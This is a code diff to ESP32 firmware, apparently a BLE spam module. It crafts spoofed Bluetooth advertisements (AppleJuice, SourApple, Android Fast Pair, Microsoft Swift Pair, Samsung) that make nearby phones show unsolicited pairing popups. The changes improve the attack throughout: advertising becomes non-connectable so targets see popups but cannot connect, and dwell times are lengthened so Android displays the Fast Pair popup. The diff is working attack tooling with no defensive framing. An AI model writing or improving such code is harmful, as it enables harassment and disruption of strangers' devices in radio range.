@@ -28,10 +28,13 @@ static void bsReinit() {
 }
 
 static void bsRestoreStack() {
-    // deinit is safe here: always called after bsReinit() or per-cycle init
+    // Give the NimBLE host task time to fully process the adv-stop event before
+    // tearing down the stack — 0ms gap was causing crashes in v2.x.
+    vTaskDelay(pdMS_TO_TICKS(200));
     NimBLEDevice::deinit(true);
-    vTaskDelay(pdMS_TO_TICKS(50));
-    NimBLEDevice::init("T-REX");
+    vTaskDelay(pdMS_TO_TICKS(100));
+    // Do NOT reinit here — same broken pattern that caused buddy→btkbd interference.
+    // Next BLE command inits fresh from uninitialised state.
     SD.begin(39);
 }
 
@@ -80,6 +83,8 @@ static int bsWait(uint32_t ms) {
 
 static void bsAdvertAndStart(NimBLEAdvertisementData& ad) {
     NimBLEAdvertising* pAdv = NimBLEDevice::getAdvertising();
+    // Non-connectable undirected: devices see the popup but cannot connect to us
+    pAdv->setConnectableMode(BLE_GAP_CONN_MODE_NON);
     pAdv->setAdvertisementData(ad);
     pAdv->setMinInterval(32); pAdv->setMaxInterval(48);  // 20ms–30ms, within BLE spec
     pAdv->start();  // NimBLE stops previous adv automatically
@@ -118,7 +123,7 @@ static void appleJuiceAdvert(uint8_t modelByte) {
         0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
         0x00, 0x00
     };
-    ad.addData(std::string((char*)pkt, sizeof(pkt)));
+    ad.addData(pkt, sizeof(pkt));
     bsAdvertAndStart(ad);
 }
 
@@ -133,7 +138,7 @@ static void sourAppleAdvert(uint8_t typeByte) {
     esp_fill_random(&pkt[8], 3);
     pkt[11] = 0x00; pkt[12] = 0x00; pkt[13] = 0x10;
     esp_fill_random(&pkt[14], 3);
-    ad.addData(std::string((char*)pkt, sizeof(pkt)));
+    ad.addData(pkt, sizeof(pkt));
     bsAdvertAndStart(ad);
 }
 
@@ -180,7 +185,7 @@ static void androidFpAdvert(uint32_t mid) {
         0x06, 0x16, 0x2c, 0xfe,                              // Service Data UUID 0xFE2C
         (uint8_t)(mid >> 16), (uint8_t)(mid >> 8), (uint8_t)(mid & 0xff)  // 3-byte model ID
     };
-    ad.addData(std::string((char*)pkt, sizeof(pkt)));
+    ad.addData(pkt, sizeof(pkt));
     bsAdvertAndStart(ad);
 }
 
@@ -199,7 +204,7 @@ void BleSpam::spamAndroid() {
         count++;
         char detail[24]; snprintf(detail, sizeof(detail), "FP: %06X", FP_KNOWN_DEVICES[idx].modelId);
         bsStatus(FP_KNOWN_DEVICES[idx].name, detail, count);
-        int r = bsWait(4000);
+        int r = bsWait(10000);   // 10 s — Android needs time to scan + show popup
         NimBLEDevice::getAdvertising()->stop();
         if (r == 'q') break;
         if (r == +1)       i = (i + 1) % FP_KNOWN_COUNT;
@@ -238,7 +243,7 @@ static void msAdvert(const char* devName) {
     pkt[2] = 0x06; pkt[3] = 0x00;      // Microsoft company ID LE (0x0006)
     pkt[4] = 0x03; pkt[5] = 0x00; pkt[6] = 0x80;
     memcpy(&pkt[7], devName, nameLen);
-    ad.addData(std::string((char*)pkt, pktLen));
+    ad.addData(pkt, pktLen);
     bsAdvertAndStart(ad);
 }
 
@@ -294,7 +299,7 @@ static void samsungAdvert(uint8_t modelByte) {
         0x01, 0x01, 0xff, 0x00,
         0x00, 0x43, modelByte
     };
-    ad.addData(std::string((char*)pkt, sizeof(pkt)));
+    ad.addData(pkt, sizeof(pkt));
     bsAdvertAndStart(ad);
 }
 
@@ -362,7 +367,8 @@ void BleSpam::spamAll() {
         count++;
         bsStatus(name, detail, count);
 
-        int r = bsWait(2500);
+        // Android needs longer — Fast Pair popup takes ~5 s to appear on phone
+        int r = bsWait(vendor == 1 ? 8000 : 2500);
         NimBLEDevice::getAdvertising()->stop();
         if (r == 'q') break;
         if (r == +1 || r == 0) vendor = (vendor + 1) % 4;
